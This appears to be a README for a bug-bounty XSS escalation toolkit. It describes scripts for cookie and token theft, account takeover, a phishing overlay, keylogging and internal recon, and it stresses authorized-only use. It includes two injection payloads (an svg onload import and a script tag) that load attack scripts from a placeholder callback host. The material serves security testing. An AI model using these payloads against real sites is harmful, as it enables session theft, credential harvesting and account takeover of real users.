# XSS Impact PoC Scripts

These are **proof-of-concept escalation payloads** for the impact phase (`XSS_TESTING_GUIDE.md` Part IV). They turn `alert(document.domain)` into the demonstrable impact that actually pays — session/token theft, CSRF-token-driven account takeover, blind-XSS landing detection, in-origin phishing, keylogging, and internal recon.

## ⚠️ Authorized use only — read before using
- Use **only** on targets you are **explicitly authorized** to test (a bug-bounty program that lists the asset in scope, or a signed red-team engagement).
- **Exfiltrate only your own test data** to **your own** collaborator. Never collect real users' cookies, tokens, or PII.
- For cross-user / ATO demonstrations, use **two of your own test accounts** (attacker A → victim B), or the program's designated test users.
- **Do not** deface, delete data, mass-fire stored payloads other users will see, or release self-propagating (worm) payloads on a live multi-user app.
- **Clean up** after testing: remove planted payloads, any added API keys/admin users, and registered service workers.
- This is the same ethical line the program's safe-harbor expects; staying on it is what keeps a finding *valid* (guide §34, §38).

## Setup
1. Stand up a callback endpoint you control:
   - Burp Collaborator / interactsh (`interactsh-client -v`), **or**
   - self-hosted XSS Hunter (best for blind — captures URL + DOM + screenshot), **or**
   - `poc-listener.py` in this folder (a minimal logging sink for quick local PoCs).
2. In each script, replace `YOUR.oast.fun` with your callback host, and `MY-TEST-INBOX` / placeholder values with your own.
3. Deliver via the context-correct payload (see `../XSS_PAYLOAD_ARSENAL.md`), e.g.:
   ```html
   <svg onload="import('//YOUR.oast.fun/cookie_steal.js')">
   <script src="//YOUR.oast.fun/blind_xss.js"></script>
   ```

## Files
| File | Demonstrates | Guide § |
|------|--------------|---------|
| `poc-listener.py` | A minimal exfil/callback server you control | §1.3 |
| `blind_xss.js` | Beacon that proves **where** a blind/stored payload fired (URL+DOM+title) | §13 |
| `cookie_steal.js` | Session cookie theft (only when cookie is **not** HttpOnly) | §24 |
| `token_exfil.js` | localStorage/sessionStorage (JWT/OAuth) theft + API call as victim | §25 |
| `account_takeover.js` | Read CSRF token → force email/password change → ATO (HttpOnly-proof) | §26/§27 |
| `phish_overlay.js` | In-origin credential-harvest overlay (authentic URL bar) | §28 |
| `keylogger.js` | Keystroke / sensitive-field capture | §29 |
| `internal_scan.js` | Internal host/port recon from the victim browser (SSRF-ish pivot) | §31 |

## How to present these in a report
- Show the **minimal** trigger payload + one of these scripts as the escalation (guide §38).
- Capture the callback log / screenshot proving execution **in the target origin** and the **impact** (e.g. victim account email changed in their session).
- Keep it safe and reversible; describe (don't perform) anything destructive or wormable (guide §33, §40).
